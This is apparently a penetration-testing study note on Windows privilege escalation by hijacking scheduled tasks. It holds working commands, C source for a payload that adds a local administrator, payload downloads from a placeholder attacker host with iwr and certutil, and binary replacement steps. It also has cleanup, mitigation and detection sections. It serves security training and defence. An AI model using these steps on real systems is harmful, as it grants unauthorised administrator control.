# Windows Privilege Escalation – Scheduled Task Hijacking

## Overview

Windows Task Scheduler executes programs and scripts automatically when configured trigger conditions are met.

A scheduled task can become a privilege escalation vector when:

```text
the task runs as a privileged account
and
the current user can modify the executable, script, DLL, or directory used by the task
and
the task will execute again within a useful timeframe
```

The general methodology is:

```text
Enumerate scheduled tasks
↓
Identify privileged task principals
↓
Review triggers and next run time
↓
Inspect actions and working directories
↓
Check permissions on executed files and directories
↓
Back up and replace a writable action target
↓
Wait for or trigger the task
↓
Validate elevated execution
↓
Restore the original file
```

> [!important]
> Scheduled task hijacking usually abuses the file or script executed by a task. The task definition itself does not need to be writable.

---

# Why Scheduled Tasks Matter

Windows uses scheduled tasks for:

- system maintenance
- software updates
- backups
- cleanup operations
- monitoring
- log rotation
- application support tasks
- administrative scripts
- recurring business processes

Tasks may run as:

```text
NT AUTHORITY\SYSTEM
local administrator
domain administrator
privileged service account
normal local user
```

If a task runs as a privileged user but executes a file writable by a lower-privileged user, replacing that file may provide code execution in the privileged task context.

---

# The Three Key Questions

For each scheduled task, determine:

## 1. Which user runs the task?

This determines the privilege level gained if the action is hijacked.

High-value principals include:

```text
SYSTEM
Administrator
local admin accounts
domain service accounts
privileged domain users
```

If the task runs as the current user, hijacking it does not normally provide privilege escalation.

---

## 2. What triggers the task?

This determines whether the task will execute again.

Common triggers include:

```text
specific time
daily
weekly
every few minutes
at startup
at logon
on workstation unlock
on idle
on event log entry
on task creation or modification
```

A task that ran once in the past and has no future trigger may not be directly exploitable.

A task that runs every minute, at logon, or at startup is significantly more useful.

---

## 3. What action does the task execute?

The action identifies the attack surface.

Common action targets include:

```text
.exe binaries
PowerShell scripts
batch files
VBScript files
Python scripts
DLLs loaded by the action
configuration files
commands with user-controlled arguments
```

The action target and its parent directories should be checked for weak permissions.

---

# Exploitation Requirements

A practical scheduled task hijack usually requires:

```text
task runs as a more privileged account
action executes a writable file or script
current user can replace or modify the target
task will execute again
payload matches the expected file type or execution method
```

Useful additional conditions:

```text
task runs frequently
task can be started manually
working directory is writable
action references a user profile path
action references ProgramData or a custom application directory
```

---

# 1. Enumerate Scheduled Tasks

## schtasks – Verbose List

```cmd
schtasks /query /fo LIST /v
```

Important fields:

```text
TaskName
Author
Task To Run
Actions
Run As User
Next Run Time
Last Run Time
Last Result
Start In
Status
Scheduled Task State
Schedule Type
```

The output can be very large, so focus on tasks with:

```text
non-Microsoft authors
custom paths
user profile paths
privileged Run As User
frequent execution
non-standard executables or scripts
```

---

## PowerShell – Get-ScheduledTask

```powershell
Get-ScheduledTask
```

Show useful properties:

```powershell
Get-ScheduledTask | Select-Object TaskName,TaskPath,State,Author
```

Inspect one task:

```powershell
Get-ScheduledTask -TaskName "<task_name>" | Format-List *
```

---

# 2. Extract Principals, Triggers, and Actions

PowerShell can inspect task components directly.

## Task Principal

```powershell
(Get-ScheduledTask -TaskName "<task_name>").Principal
```

Useful properties:

```text
UserId
LogonType
RunLevel
```

---

## Task Triggers

```powershell
(Get-ScheduledTask -TaskName "<task_name>").Triggers
```

Look for:

```text
StartBoundary
Enabled
Repetition
Interval
Duration
AtStartup
AtLogOn
```

---

## Task Actions

```powershell
(Get-ScheduledTask -TaskName "<task_name>").Actions
```

Useful properties:

```text
Execute
Arguments
WorkingDirectory
```

---

## Combined Inspection

```powershell
$task = Get-ScheduledTask -TaskName "<task_name>"

$task.Principal
$task.Triggers
$task.Actions
```

---

# 3. Prioritise Interesting Tasks

High-value indicators include:

```text
Run As User is SYSTEM or an administrator
Executable is stored in a user profile
Script is stored in a writable directory
Action references C:\Users\Public
Action references C:\ProgramData
Action references a custom application directory
Task runs every few minutes
Task is enabled and ready
```

Example high-risk task:

```text
TaskName:      \Microsoft\CacheCleanup
Run As User:   administrator
Task To Run:   C:\Users\operator\Pictures\BackendCacheCleanup.exe
Start In:      C:\Users\operator\Pictures
Next Run Time: every minute
```

Why it is high value:

```text
privileged principal
action stored in lower-privileged user's profile
frequent trigger
likely writable executable
```

---

# 4. Check Action File Permissions

Use `icacls`:

```cmd
icacls "C:\Path\To\TaskBinary.exe"
```

Example:

```cmd
icacls "C:\Users\operator\Pictures\BackendCacheCleanup.exe"
```

Common permission masks:

| Mask | Meaning |
|---|---|
| `F` | Full control |
| `M` | Modify |
| `W` | Write |
| `RX` | Read and execute |
| `R` | Read |

High-risk examples:

```text
CurrentUser:(F)
BUILTIN\Users:(M)
Authenticated Users:(W)
Everyone:(F)
```

---

# 5. Check Parent Directory Permissions

Even if the file itself is not writable, the parent directory may allow replacement.

```cmd
icacls "C:\Path\To\TaskDirectory"
```

Example:

```cmd
icacls "C:\Users\operator\Pictures"
```

A writable directory may allow:

```text
renaming the original file
deleting the original
placing a replacement
adding a malicious DLL or config
```

---

# 6. Check Script Permissions

Tasks may execute scripts rather than binaries.

Common extensions:

```text
.ps1
.bat
.cmd
.vbs
.py
.js
```

Check with:

```cmd
icacls "C:\Path\To\script.ps1"
```

Read the script:

```powershell
Get-Content "C:\Path\To\script.ps1"
```

Look for:

```text
other writable scripts
relative paths
external commands
DLL loads
config files
credential files
user-controlled directories
```

---

# 7. Check Whether the Task Can Be Started Manually

Using `schtasks`:

```cmd
schtasks /run /tn "<task_path>\<task_name>"
```

Example:

```cmd
schtasks /run /tn "\Microsoft\CacheCleanup"
```

PowerShell:

```powershell
Start-ScheduledTask -TaskName "<task_name>"
```

If manual start succeeds, exploitation can be triggered immediately.

If not, wait for the configured trigger or identify another trigger path.

---

# 8. Review Trigger Timing

Important fields from `schtasks`:

```text
Next Run Time
Last Run Time
Schedule Type
Start Time
Start Date
```

A useful task should:

```text
be enabled
have a future or repeating trigger
run within the assessment window
```

A non-immediate but valid issue should still be documented if it represents a real privilege escalation path.

---

# 9. Back Up the Original Action File

Before replacement:

```cmd
copy "C:\Path\To\TaskBinary.exe" "C:\Users\Public\TaskBinary.exe.bak"
```

or:

```cmd
move "C:\Path\To\TaskBinary.exe" "C:\Users\Public\TaskBinary.exe.bak"
```

PowerShell:

```powershell
Copy-Item "C:\Path\To\TaskBinary.exe" "C:\Users\Public\TaskBinary.exe.bak"
```

> [!important]
> Preserve the original file so the scheduled task can be restored after testing.

---

# 10. Create a Controlled Payload

## Example – Create Temporary Local Administrator

```c
#include <stdlib.h>

int main()
{
    system("net user taskadmin Password123! /add");
    system("net localgroup administrators taskadmin /add");

    return 0;
}
```

Save as:

```text
adduser.c
```

> [!warning]
> Account creation is intrusive. Use only in a lab or where explicitly authorised, and remove the account during cleanup.

---

# 11. Compile the Payload

## 64-bit

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

## 32-bit

```bash
i686-w64-mingw32-gcc adduser.c -o adduser.exe
```

Confirm target architecture:

```cmd
systeminfo
```

```cmd
echo %PROCESSOR_ARCHITECTURE%
```

---

# 12. Transfer the Payload

Start an HTTP server:

```bash
python3 -m http.server 80
```

Download with PowerShell:

```powershell
iwr -Uri http://<attacker_ip>/adduser.exe -OutFile C:\Users\Public\adduser.exe
```

Using `certutil`:

```cmd
certutil -urlcache -f http://<attacker_ip>/adduser.exe C:\Users\Public\adduser.exe
```

---

# 13. Replace the Scheduled Task Action

Move the original file:

```cmd
move "C:\Path\To\TaskBinary.exe" "C:\Users\Public\TaskBinary.exe.bak"
```

Move the payload into place using the original filename:

```cmd
move "C:\Users\Public\adduser.exe" "C:\Path\To\TaskBinary.exe"
```

Example:

```powershell
Move-Item "C:\Users\operator\Pictures\BackendCacheCleanup.exe" "C:\Users\Public\BackendCacheCleanup.exe.bak"
```

```powershell
Move-Item "C:\Users\Public\adduser.exe" "C:\Users\operator\Pictures\BackendCacheCleanup.exe"
```

Confirm:

```cmd
dir "C:\Path\To\TaskBinary.exe"
```

---

# 14. Trigger or Wait for Execution

## Manual Trigger

```cmd
schtasks /run /tn "<task_name>"
```

or:

```powershell
Start-ScheduledTask -TaskName "<task_name>"
```

## Wait for Repeating Trigger

Monitor:

```cmd
schtasks /query /tn "<task_name>" /fo LIST /v
```

Look for updated:

```text
Last Run Time
Last Result
Next Run Time
```

---

# 15. Validate Privilege Escalation

Check users:

```cmd
net user
```

Check administrators:

```cmd
net localgroup administrators
```

PowerShell:

```powershell
Get-LocalGroupMember Administrators
```

For proof-file payloads:

```cmd
type C:\Windows\Temp\task-proof.txt
```

---

# Alternative Payload – Proof File

A less intrusive payload can record the execution context.

```c
#include <stdlib.h>

int main()
{
    system("whoami > C:\\Windows\\Temp\\task-proof.txt");

    return 0;
}
```

Compile:

```bash
x86_64-w64-mingw32-gcc proof.c -o TaskBinary.exe
```

Validate:

```cmd
type C:\Windows\Temp\task-proof.txt
```

Expected high-value output:

```text
nt authority\system
```

or an administrative user.

---

# Alternative Abuse Paths

Scheduled tasks can often be abused without replacing the main executable.

Check for:

## Writable Scripts

```text
PowerShell script
batch file
VBScript
Python script
```

Modify the script to execute a controlled command.

---

## Writable DLLs

If the task action launches an application with a DLL hijacking weakness:

```text
scheduled task
↓
privileged application
↓
writable or missing DLL
↓
DLL hijack
```

---

## Relative Paths

Example action:

```text
cleanup.exe
```

without an absolute path.

Check the task's working directory and search behavior.

---

## Writable Configuration Files

The action may read:

```text
.ini
.xml
.json
.yaml
.config
```

A writable configuration file could alter:

- command paths
- script paths
- plugin locations
- DLL paths
- output commands

---

## Writable Parent Directory

If the action file is protected but the directory is writable, replacement may still be possible.

---

# PowerShell Enumeration Workflow

## List Non-Microsoft Tasks

```powershell
Get-ScheduledTask |
Where-Object {$_.TaskPath -notlike "\Microsoft\Windows\*"} |
Select-Object TaskPath,TaskName,State
```

## Show Tasks and Principals

```powershell
Get-ScheduledTask | ForEach-Object {
    [PSCustomObject]@{
        TaskName = "$($_.TaskPath)$($_.TaskName)"
        State    = $_.State
        UserId   = $_.Principal.UserId
        RunLevel = $_.Principal.RunLevel
    }
}
```

## Show Task Actions

```powershell
Get-ScheduledTask | ForEach-Object {
    foreach ($action in $_.Actions) {
        [PSCustomObject]@{
            TaskName         = "$($_.TaskPath)$($_.TaskName)"
            Execute          = $action.Execute
            Arguments        = $action.Arguments
            WorkingDirectory = $action.WorkingDirectory
            UserId           = $_.Principal.UserId
        }
    }
}
```

---

# Practical Workflow

## Phase 1 – Enumerate Tasks

```cmd
schtasks /query /fo LIST /v
```

Focus on:

```text
TaskName
Run As User
Task To Run
Start In
Next Run Time
Last Run Time
```

---

## Phase 2 – Confirm Privileged Context

Ask:

```text
Does the task run as SYSTEM or an administrator?
Would execution provide higher privileges than the current user?
```

---

## Phase 3 – Review Trigger

Ask:

```text
Will the task run again?
How often?
Can it be triggered manually?
Does it run at startup or logon?
```

---

## Phase 4 – Inspect Action

Check:

```text
executable path
script path
arguments
working directory
related DLLs
config files
```

---

## Phase 5 – Check Permissions

```cmd
icacls "C:\Path\To\ActionFile"
```

```cmd
icacls "C:\Path\To\ActionDirectory"
```

---

## Phase 6 – Back Up and Replace

```cmd
move "C:\Path\Action.exe" "C:\Users\Public\Action.exe.bak"
move "C:\Users\Public\payload.exe" "C:\Path\Action.exe"
```

---

## Phase 7 – Trigger and Validate

```cmd
schtasks /run /tn "<task_name>"
```

or wait for the trigger.

Validate:

```cmd
net localgroup administrators
```

---

## Phase 8 – Restore

```cmd
del "C:\Path\Action.exe"
move "C:\Users\Public\Action.exe.bak" "C:\Path\Action.exe"
```

---

# Decision Tree

## Does the Task Run as a Privileged User?

```text
No
→ Not a direct privilege escalation path

Yes
→ Inspect trigger and actions
```

---

## Will the Task Run Again?

```text
No future trigger
→ Report the issue but look for another path

Frequent or recurring trigger
→ Continue
```

---

## Is the Action File Writable?

```text
Yes
→ Back up and replace it

No
→ Check parent directory, scripts, DLLs, and configs
```

---

## Can the Task Be Started Manually?

```text
Yes
→ Trigger immediately

No
→ Wait for scheduled trigger or identify startup/logon condition
```

---

## Did the Task Run but No Result Appeared?

Check:

```text
payload architecture
file path
task arguments
working directory
AV/EDR blocking
task last result
task history
```

---

# Troubleshooting

## schtasks Output Is Too Large

Query a specific task:

```cmd
schtasks /query /tn "<task_name>" /fo LIST /v
```

Export task XML:

```cmd
schtasks /query /tn "<task_name>" /xml
```

---

## Task Action Path Contains Arguments

Example:

```text
powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\cleanup.ps1
```

Check the actual script:

```cmd
icacls "C:\Scripts\cleanup.ps1"
```

Do not focus only on `powershell.exe`.

---

## Task Uses cmd.exe

Example:

```text
cmd.exe /c C:\Scripts\backup.bat
```

Check:

```cmd
icacls "C:\Scripts\backup.bat"
```

Then inspect any commands and files referenced by the script.

---

## Cannot Replace the Action File

Check:

```text
file ACL
directory ACL
file lock
ownership
Delete permission
AV/EDR protection
```

Try renaming rather than overwriting:

```cmd
move "C:\Path\Action.exe" "C:\Users\Public\Action.exe.bak"
```

---

## Manual Task Start Is Denied

Check whether:

```text
the task runs automatically soon
the task triggers at logon
the task triggers at startup
another user can trigger it
the host can be safely rebooted
```

---

## Payload Does Not Behave Like the Expected Program

The task may report an error because the replacement does not support expected arguments.

The payload may still have executed.

Always verify the side effect:

```cmd
net user
```

```cmd
type C:\Windows\Temp\task-proof.txt
```

---

## Task Uses a Relative Working Directory

Inspect:

```text
Start In
WorkingDirectory
```

Relative script, DLL, or config paths may be resolved from that directory.

Check its permissions:

```cmd
icacls "<working_directory>"
```

---

# Cleanup

Restore the original action file:

```cmd
del "C:\Path\To\TaskBinary.exe"
```

```cmd
move "C:\Users\Public\TaskBinary.exe.bak" "C:\Path\To\TaskBinary.exe"
```

Remove temporary account:

```cmd
net user taskadmin /delete
```

Remove proof files:

```cmd
del C:\Windows\Temp\task-proof.txt
```

Remove transferred payloads:

```cmd
del C:\Users\Public\adduser.exe
```

Confirm task behavior:

```cmd
schtasks /query /tn "<task_name>" /fo LIST /v
```

Where authorised, allow or trigger the task once more to verify normal operation.

---

# Command Reference

## Enumerate all tasks

```cmd
schtasks /query /fo LIST /v
```

## Query one task

```cmd
schtasks /query /tn "<task_name>" /fo LIST /v
```

## Export task XML

```cmd
schtasks /query /tn "<task_name>" /xml
```

## List tasks with PowerShell

```powershell
Get-ScheduledTask
```

## Inspect one task

```powershell
Get-ScheduledTask -TaskName "<task_name>" | Format-List *
```

## Show actions

```powershell
(Get-ScheduledTask -TaskName "<task_name>").Actions
```

## Show triggers

```powershell
(Get-ScheduledTask -TaskName "<task_name>").Triggers
```

## Show principal

```powershell
(Get-ScheduledTask -TaskName "<task_name>").Principal
```

## Check file permissions

```cmd
icacls "C:\Path\To\ActionFile"
```

## Check directory permissions

```cmd
icacls "C:\Path\To\Directory"
```

## Run task manually

```cmd
schtasks /run /tn "<task_name>"
```

## Run task with PowerShell

```powershell
Start-ScheduledTask -TaskName "<task_name>"
```

## Compile payload

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

## Download payload

```powershell
iwr -Uri http://<attacker_ip>/adduser.exe -OutFile C:\Users\Public\adduser.exe
```

## Back up action

```cmd
move "C:\Path\Action.exe" "C:\Users\Public\Action.exe.bak"
```

## Replace action

```cmd
move "C:\Users\Public\adduser.exe" "C:\Path\Action.exe"
```

## Validate administrators

```cmd
net localgroup administrators
```

---

# Defensive Notes

## Root Cause

Scheduled task hijacking occurs when:

```text
a privileged task executes a file
and
an unprivileged user can modify or replace that file
```

Common causes include:

- actions stored in user profiles
- writable scripts
- writable application directories
- overly permissive ACLs
- relative action paths
- writable working directories
- privileged tasks created by developers or administrators without permission review

---

# Mitigations

Administrators should:

```text
store privileged task actions in protected directories
restrict write access to binaries and scripts
avoid executing files from user profiles
use absolute paths
review task principals and RunLevel
use dedicated least-privileged service accounts
audit custom scheduled tasks
review script and DLL dependencies
monitor task changes
```

Recommended file permissions:

```text
SYSTEM: Full Control
Administrators: Full Control
Users: Read and Execute
```

---

# Detection Ideas

Monitor for:

```text
modification of scheduled task action files
new executables written into task directories
changes to task definitions
schtasks /run usage
unexpected child processes from Task Scheduler
local administrator account creation
PowerShell or cmd spawned by task actions
```

Relevant Windows event logs may include:

```text
Microsoft-Windows-TaskScheduler/Operational
Security log
Sysmon process creation and file creation events
```

Suspicious sequence:

```text
task enumeration
↓
icacls against action path
↓
original action renamed
↓
new executable written
↓
task executes as privileged user
↓
new administrator or privileged process appears
```

---

# Key Takeaways

- Always determine the task principal, trigger, and action.
- A task must run as a more privileged user to provide escalation.
- Confirm that the task will execute again within a useful timeframe.
- Check both the action file and its parent directory for write access.
- Scripts, DLLs, configs, and relative paths may be exploitable even when the main executable is protected.
- Frequent tasks and startup/logon tasks are especially valuable.
- A task error does not necessarily mean the payload failed.
- Back up the original action file before replacement.
- Restore the original task functionality and remove temporary artifacts after testing.

---

# Related Notes

- [[Windows Privilege Escalation]]
- [[Scheduled Tasks]]
- [[Service Binary Hijacking]]
- [[DLL Hijacking]]
- [[Weak File Permissions]]
- [[Windows ACLs]]
- [[PowerShell]]
- [[Task Scheduler]]
- [[Windows Services]]

---

# Tags

#windows
#privilege-escalation
#scheduled-tasks
#task-scheduler
#weak-permissions
#binary-hijacking
#script-hijacking
#icacls
#system
#pentesting
#oscp